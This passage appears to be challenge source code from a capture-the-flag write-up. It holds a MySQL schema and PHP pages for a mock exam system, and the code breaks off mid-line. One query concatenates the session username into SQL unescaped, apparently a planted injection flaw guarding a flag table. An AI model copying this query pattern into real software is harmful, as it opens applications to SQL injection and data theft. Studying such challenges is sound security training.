class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure <span class="keyword">for</span> challengesAll</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `challengesAll`;</span><br><span class="line">CREATE TABLE `challengesAll`  (</span><br><span class="line">  `id` <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `type` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `Title` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `OptionA` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `OptionB` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `OptionC` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `OptionD` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `Answer` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="title function_ invoke__">KEY</span> (`id`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB AUTO_INCREMENT = <span class="number">12</span> CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure <span class="keyword">for</span> ctf</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `ctf`;</span><br><span class="line">CREATE TABLE `ctf`  (</span><br><span class="line">  `id` <span class="keyword">int</span>(<span class="number">11</span>) <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `name` mediumtext CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span>,</span><br><span class="line">  `value` mediumtext CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span></span><br><span class="line">) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure <span class="keyword">for</span> randChallenges</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `randChallenges`;</span><br><span class="line">CREATE TABLE `randChallenges`  (</span><br><span class="line">  `id` <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `challengeId1` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `challengeId2` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `challengeId3` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `challengeId4` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `challengeId5` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="title function_ invoke__">KEY</span> (`id`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB AUTO_INCREMENT = <span class="number">13</span> CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure <span class="keyword">for</span> score</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `score`;</span><br><span class="line">CREATE TABLE `score`  (</span><br><span class="line">  `id` <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` mediumtext CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span>,</span><br><span class="line">  `score` <span class="keyword">int</span>(<span class="number">255</span>) <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="title function_ invoke__">KEY</span> (`id`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB AUTO_INCREMENT = <span class="number">6</span> CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure <span class="keyword">for</span> userAnswer</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `userAnswer`;</span><br><span class="line">CREATE TABLE `userAnswer`  (</span><br><span class="line">  `id` <span class="keyword">int</span>(<span class="number">11</span>) NOT <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `studentid` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `ans1` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `ans2` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `ans3` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `ans4` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  `ans5` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="title function_ invoke__">KEY</span> (`id`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB AUTO_INCREMENT = <span class="number">5</span> CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure <span class="keyword">for</span> users</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `users`;</span><br><span class="line">CREATE TABLE `users`  (</span><br><span class="line">  `id` <span class="keyword">int</span>(<span class="number">11</span>) UNSIGNED NOT <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` mediumtext CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span>,</span><br><span class="line">  `studentid` <span class="title function_ invoke__">varchar</span>(<span class="number">255</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="title function_ invoke__">KEY</span> (`id`) USING BTREE,</span><br><span class="line">  UNIQUE INDEX `studentid`(`studentid`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB AUTO_INCREMENT = <span class="number">14</span> CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MYSQL_HOST&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MYSQL_USER&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MYSQL_PASSWORD&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MYSQL_DATABASE&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_fopen&#x27;</span>, <span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.cookie_httponly&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_deep</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;addslashes_deep&#x27;</span>, <span class="variable">$value</span>): <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_fopen&#x27;</span>, <span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">    &lt;head&gt;&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width,initial-scale=1.0,user-scalable=no&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;<span class="number">2022</span>年全国统一高考数学试卷(理科)&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">            &lt;h1&gt;<span class="number">2022</span>年全国统一高考数学试卷(理科)&lt;/h1&gt;</span><br><span class="line">            &lt;td&gt;欢迎&lt;/td&gt;&amp;nbsp&lt;b&gt;<span class="meta">&lt;?=</span><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];<span class="meta">?&gt;</span>&lt;/b&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;td&gt;&lt;a href=<span class="string">&quot;logout.php&quot;</span>&gt;登出&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="string">&#x27;admin&#x27;</span>):&#123; <span class="meta">?&gt;</span></span><br><span class="line">            查询&lt;td&gt;&lt;a href=<span class="string">&quot;score.php&quot;</span>&gt;成绩&lt;/a&gt;&lt;/td&gt;或&lt;td&gt;&lt;a href=<span class="string">&quot;rank.php&quot;</span>&gt;排名&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;br&gt;</span><br><span class="line">            &lt;b&gt;where_is_flag?&lt;/b&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">endif</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line">            <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);</span><br><span class="line">            <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>,<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from score where username=&#x27;&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&#x27;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt;= <span class="number">1</span>) &#123;<span class="meta">?&gt;</span></span><br><span class="line">                    &lt;/br&gt;您已完成考试&lt;/br&gt;查询&lt;td&gt;&lt;a href=<span class="string">&quot;score.php&quot;</span>&gt;成绩&lt;/a&gt;&lt;/td&gt;或&lt;td&gt;&lt;a href=<span class="string">&quot;rank.php&quot;</span>&gt;排名&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">                    <span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT</span></span><br><span class="line"><span class="string">                    type,Title,OptionA,OptionB,OptionC,OptionD</span></span><br><span class="line"><span class="string">                FROM</span></span><br><span class="line"><span class="string">                    challengesAll,randChallenges </span></span><br><span class="line"><span class="string">                WHERE</span></span><br><span class="line"><span class="string">                    randChallenges.username = &#x27;&quot;</span>.<span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string">                    AND (challengesAll.id = randChallenges.challengeId1 </span></span><br><span class="line"><span class="string">                    OR challengesAll.id = randChallenges.challengeId2 </span></span><br><span class="line"><span class="string">                    OR challengesAll.id = randChallenges.challengeId3 </span></span><br><span class="line"><span class="string">                    OR challengesAll.id = randChallenges.challengeId4 </span></span><br><span class="line"><span class="string">                    OR challengesAll.id = randChallenges.challengeId5) </span></span><br><span class="line"><span class="string">                &quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows == <span class="number">5</span>) &#123;</span><br><span class="line">                        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_all</span>();</span><br><span class="line">                        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$row</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">0</span>]==<span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">                &lt;div&gt;</span></span><br><span class="line"><span class="string">                    &#x27;</span>.(<span class="variable">$i</span>+<span class="number">1</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">1</span>].<span class="string">&#x27;&lt;br&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div&gt;</span></span><br><span class="line"><span class="string">                        &lt;tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;input type=&quot;radio&quot; name=&quot;q&#x27;</span>.(<span class="variable">$i</span>+<span class="number">1</span>).<span class="string">&#x27;&quot; aria-describedby=&quot;q&#x27;</span>.(<span class="variable">$i</span>+<span class="number">1</span>).<span class="string">&#x27;&quot; value=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="string">                            A、&#x27;</span>.<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">2</span>].<span class="string">&#x27;</span></span><br><span class="line"><span class="string">                        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                        &lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;input type=&quot;radio&quot; name=&quot;q&#x27;</span>.(<span class="variable">$i</span>+<span class="number">1</span>).<span class="string">&#x27;&quot; aria-describedby=&quot;q&#x27;</span>.(<span class="variable">$i</span>+<span class="number">1</span>).<span class="string">&#x27;&quot; value=&quot;2&quot;&gt;</span></span><br><span class="line"><span class="string">                            B、&#x27;</span>.<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">3</span>].<span class="string">&#x27;</span></span><br><span class="line"><span class="string">                        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                        &lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;input type=&quot;radio&quot; name=&quot;q&#x27;</span>.(<span class="variable">$i</span>+<span class="number">1</span>).<span class="string">&#x27;&quot; aria-describedby=&quot;q&#x27;</span>.(<span class="variable">$i</span>+<span class="number">1</span>).<span class="string">&#x27;&quot; value=&quot;3&quot;&gt;</span></span><br><span class="line"><span class="string">                            C、&#x27;</span>.<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">4</span>].<span class="string">&#x27;</span></span><br><span class="line"><span class="string">                        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                        &lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;input type=&quot;radio&quot; name=&quot;q&#x27;</span>.(<span class="variable">$i</span>+<span class="number">1</span>).<span class="string">&#x27;&quot; aria-describedby=&quot;q&#x27;</span>.(<span class="variable">$i</span>+<span class="number">1</span>).<span class="string">&#x27;&quot; value=&quot;4&quot;&gt;</span></span><br><span class="line"><span class="string">                            D、&#x27;</span>.<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="number">5</span>].<span class="string">&#x27;</span></span><br><span class="line"><span class="string">                        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&quot;题库错误,请重新注册后刷新.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">        请先&lt;td&gt;&lt;a href=<span class="string">&quot;login.php&quot;</span>&gt; 登陆&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">        或&lt;td&gt;&lt;a href=<span class="string">&quot;register.php&quot;</span>&gt; 注册&lt;/a&gt;&lt;/td&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        查询&lt;td&gt;&lt;a href=<span class="string">&quot;score.php&quot;</span>&gt;成绩&lt;/a&gt;&lt;/td&gt;或&lt;td&gt;&lt;a href=<span class="string">&quot;rank.php&quot;</span>&gt;排名&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$getscroe</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q1&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q2&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q3&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q4&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q5&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT</span></span><br><span class="line"><span class="string">            Answer</span></span><br><span class="line"><span class="string">        FROM</span></span><br><span class="line"><span class="string">            challengesAll,</span></span><br><span class="line"><span class="string">            randChallenges </span></span><br><span class="line"><span class="string">        WHERE</span></span><br><span class="line"><span class="string">            randChallenges.username = &#x27;&quot;</span>.<span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;studentid&#x27;</span>]).<span class="string">&quot;&#x27; </span></span><br><span class="line"><span class="string">            AND (challengesAll.id = randChallenges.challengeId1 </span></span><br><span class="line"><span class="string">            OR challengesAll.id = randChallenges.challengeId2 </span></span><br><span class="line"><span class="string">            OR challengesAll.id = randChallenges.challengeId3 </span></span><br><span class="line"><span class="string">            OR challengesAll.id = randChallenges.challengeId4 </span></span><br><span class="line"><span class="string">            OR challengesAll.id = randChallenges.challengeId5)</span></span><br><span class="line"><span class="string">	&quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_all</span>();</span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;q1&#x27;</span>] == <span class="variable">$row</span>[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">            <span class="variable">$getscroe</span> = <span class="variable">$getscroe</span>+<span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;q2&#x27;</span>] == <span class="variable">$row</span>[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">            <span class="variable">$getscroe</span> = <span class="variable">$getscroe</span>+<span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;q3&#x27;</span>] == <span class="variable">$row</span>[<span class="number">2</span>][<span class="number">0</span>])</span><br><span class="line">            <span class="variable">$getscroe</span> = <span class="variable">$getscroe</span>+<span class="number">20</span>;</span><br><span 